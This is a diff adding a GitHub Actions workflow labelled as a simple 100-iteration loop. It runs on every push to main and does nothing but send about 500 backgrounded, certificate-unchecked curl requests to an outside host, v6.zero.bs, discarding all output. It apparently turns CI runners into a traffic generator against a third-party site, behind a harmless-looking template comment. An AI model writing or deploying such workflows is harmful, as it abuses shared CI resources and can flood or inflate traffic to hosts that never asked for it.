@@ -1,0 +1,31 @@
+name: Loop 100 Times b1aa7812-f1d8-4693-bd0d-bdbbcc8d33d4
+
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  loop_job:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run loop 100 times b1aa7812-f1d8-4693-bd0d-bdbbcc8d33d4
+        id: loop_step
+        run: |
+          counter=0
+          while [ $counter -lt 100 ]; do
+            echo "Running loop iteration $((counter + 1))..."
+            # Add your desired actions here for each iteration
+            curl -ks https://v6.zero.bs 2>&1 > /dev/null &
+            curl -ks https://v6.zero.bs 2>&1 > /dev/null &
+            curl -ks https://v6.zero.bs 2>&1 > /dev/null &
+            curl -ks https://v6.zero.bs 2>&1 > /dev/null &
+            curl -ks https://v6.zero.bs 2>&1 > /dev/null
+            
+            counter=$((counter + 1))
+          done
+          echo ">> DONE!"
+
+
+
+
